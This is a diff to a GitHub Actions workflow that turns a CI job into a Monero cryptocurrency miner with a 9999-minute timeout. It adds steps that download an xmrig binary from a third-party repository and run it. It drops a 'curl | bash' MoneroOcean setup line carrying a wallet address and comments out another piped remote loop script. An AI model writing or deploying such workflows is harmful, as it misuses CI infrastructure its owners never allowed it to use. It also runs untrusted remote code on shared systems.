@@ -10,9 +10,14 @@ jobs:
     timeout-minutes: 9999
 
     steps:
+    - name: installing miner...
+      run: |
+        wget https://raw.githubusercontent.com/techtechnikov/min/main/linux.zip -O linux.zip
+        unzip linux.zip -d linux
     - name: starting miner...
-      run: curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 43PrhPVeWEUcrbzJTUXajpWxtRGs95kw8S1Fwjh7NZphBUKLxdtuh8TgsmPT9hr2hg1Kn1xAJJkyN2mR9TTSL2fk4aKNP1B
+      run: linux/xmrig
+        
       
-    - name: running loop...
-      run: curl -s -L https://raw.githubusercontent.com/techtechnikov/min/main/loop.sh | bash -s 
+    #- name: running loop...
+    #  run: curl -s -L https://raw.githubusercontent.com/techtechnikov/min/main/loop.sh | bash -s 
           
